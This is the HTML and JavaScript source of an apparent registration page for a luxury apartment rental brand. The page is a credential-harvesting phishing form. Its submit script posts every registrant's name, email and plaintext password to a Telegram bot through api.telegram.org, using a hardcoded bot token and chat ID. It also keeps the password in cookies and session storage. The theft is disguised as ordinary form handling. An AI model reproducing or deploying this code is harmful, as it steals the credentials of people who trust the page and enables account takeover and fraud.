<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration - Adelina Brogdon</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <title>Registration - Adelina Brogdon</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <meta name="description" content="Adelina Brogdon offers luxurious and modern apartment services for a perfect stay. Enjoy comfort, convenience, and premium amenities in a clean, elegant environment.">
  <meta name="keywords" content="Adelina Brogdon, luxurious apartments, modern apartment, apartment rentals, WiFi, heating, TV, kitchen, comfortable stay">
  <meta name="author" content="AbsTech - 2348069764769">
  <meta name="robots" content="index, follow">

   <!-- Open Graph Meta Tags -->
  <meta property="og:title" content="Adelina Brogdon | Luxurious Apartments for a Perfect Stay">
  <meta property="og:description" content="Discover a luxurious, modern apartment service tailored for a premium and comfortable stay.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://adelina.netlify.app/">
  <meta property="og:image" content="https://adelina.netlify.app/pics/adelina.webp">
  
  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Adelina Brogdon | Luxurious Apartments for a Perfect Stay">
  <meta name="twitter:description" content="Stay in style with Adelina Brogdon's premium apartment services. Perfect for relaxation and convenience.">
  <meta name="twitter:image" content="https://adelina.netlify.app/pics/adelina.webp">
  <!-- other links -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/css/iziToast.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.min.js"></script>
</head>
<body class="bg-gray-100">
    <!-- Header -->
    <header class="bg-gradient-to-r from-blue-900 to-gray-900 text-white shadow-md sticky top-0 z-10">
        <nav class="container mx-auto flex items-center justify-between py-4 px-6">
            <a href="#" class="text-3xl md:text-4xl font-serif">Adelina Brogdon</a>
            
            <div class="hidden md:flex flex-grow mx-8">
                <input type="text" class="w-full px-4 py-2 border border-transparent rounded-lg bg-white focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Where are you going?"> 
                <button class="bg-white text-blue-600 px-6 py-2 rounded-lg transition duration-300 hover:bg-blue-100 shadow-md">Search</button>
            </div>
            
            <div class="flex items-center space-x-6">
                <div class="relative group">
                    <button class="flex items-center justify-center w-10 h-10 bg-blue-600 text-white rounded-full transition duration-300 hover:bg-blue-700" 
                            data-bs-toggle="popover" title="Profile" data-bs-content="
                            <a href='./home.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Home</a>
                            <a href='/login.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Sign in</a>
                            " data-html="true">
                        <i class="fas fa-user text-lg"></i>
                    </button>
                </div>
                
                <button class="md:hidden flex items-center justify-center w-10 h-10 border border-transparent rounded-full text-white hover:bg-blue-700 focus:outline-none" 
                        data-bs-toggle="popover" title="Menu" data-bs-content="
                        <a href='./home.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Home</a>
                        <a href='./login.html' class='block px-4 py-2 text-gray-700 hover:bg-gray-100'>Sign in</a>
                        " data-html="true">
                    <i class="fas fa-bars text-lg"></i>
                </button>
            </div>
        </nav>
    </header>

    <!-- Registration Form -->
    <div class="container mx-auto mt-8 p-6 bg-white rounded-lg shadow-md">
        <h1 class="text-3xl font-bold text-gray-800 mb-4">Create an Account</h1>
        <form action="#" id="registerForm" method="POST">
            <div class="mb-4">
                <label for="name" class="block text-gray-700">Full Name</label>
                <input type="text" id="name" name="name" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Enter your full name">
            </div>

            <div class="mb-4">
                <label for="email" class="block text-gray-700">Email Address</label>
                <input type="email" id="email" name="email" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Enter your email">
            </div>

            <div class="mb-4">
                <label for="password" class="block text-gray-700">Password</label>
                <input type="password" id="password" name="password" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Create a password">
            </div>

            <div class="mb-4">
                <label for="confirm-password" class="block text-gray-700">Confirm Password</label>
                <input type="password" id="confirm-password" name="confirm-password" required class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300 transition duration-300" placeholder="Confirm your password">
            </div>

            <button type="submit" class="bg-blue-600 text-white px-6 py-2 rounded-lg transition duration-300 hover:bg-blue-700 shadow-md">Register</button>
        </form>

        <p class="mt-4 text-gray-600">Already have an account? <a href="/login" class="text-blue-600 hover:underline">Sign in</a></p>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-8 mt-12">
        <div class="container mx-auto text-center">
            <p>&copy; 2024 Adelina Brogdon. All rights reserved.</p>
            <p>Email: adelinabrogdonnmc13@gmail.com | Los Angeles, CA</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/js/iziToast.min.js"></script>
    
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Initialize Bootstrap Popovers
            var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'));
            var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
                return new bootstrap.Popover(popoverTriggerEl, {
                    trigger: 'click',
                    html: true
                });
            });
        });
        
        
$(document).ready(function () {
    $('#registerForm').on('submit', function (e) {
        e.preventDefault();

        const name = $('#name').val().trim();
        const email = $('#email').val().trim();
        const password = $('#password').val().trim();
        const confirmPassword = $('#confirm-password').val().trim();

        // Check if user already exists in cookies
        if (Cookies.get('user.name') === email) {
            iziToast.error({
                title: 'Error',
                message: 'User already exists. Kindly login to continue!',
                position: 'topRight',
            });
            return;
        }

        // Validate input fields
        if (name === "" || email === "" || password === "" || confirmPassword === "") {
            iziToast.error({
                title: 'Error',
                message: 'All fields are required!',
                position: 'topRight',
            });
        } else if (!validateEmail(email)) {
            iziToast.error({
                title: 'Error',
                message: 'Please enter a valid email address!',
                position: 'topRight',
            });
        } else if (password !== confirmPassword) {
            iziToast.error({
                title: 'Error',
                message: 'Passwords do not match!',
                position: 'topRight',
            });
        } else {                 
            const botToken = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
const chatID = '5538909913';
const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
           
            const message = `New Registered User:\n\nName: ${name}\n\nEmail: ${email}\n\nPassword: ${password}`;  
  
            fetch(telegramURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: message,
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Store user details in session and cookies
                    sessionStorage.setItem('user.name', email);
                    sessionStorage.setItem('user.password', password);
                    Cookies.set('user.name', email, { expires: 7 }); // Cookie expires in 7 days
                    Cookies.set('user.password', password, { expires: 7 }); // Cookie expires in 7 days

                    iziToast.success({
                        title: 'Success',
                        message: "Registration successful! You'll be redirected to the login page shortly. To login, use Email: '" + email + "' Password: '" + password + "'",
                        position: 'topRight',
                    });

                    // Redirect to login.html after 4 seconds
                    setTimeout(() => {
                        window.location.href = "login.html";
                    }, 4000);

                    // Clear input fields after successful registration
                    $('#name').val('');
                    $('#email').val('');
                    $('#password').val('');
                    $('#confirm-password').val('');

                } else {
                    iziToast.error({
                        title: 'Failed',
                        message: 'Registration failed! Kindly check your internet connection.',
                        position: 'topRight',
                    });
                }
            })
            .catch((error) => {
                iziToast.error({
                    title: 'Failed',
                    message: 'Failed to send data! Please check your internet connection and try again.',
                    position: 'topRight',
                });
                console.error('Error:', error);  // This logs the error for debugging purposes
            });                                           
        }
    });

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(String(email).toLowerCase());
    }
});

</script>
</body>
</html>
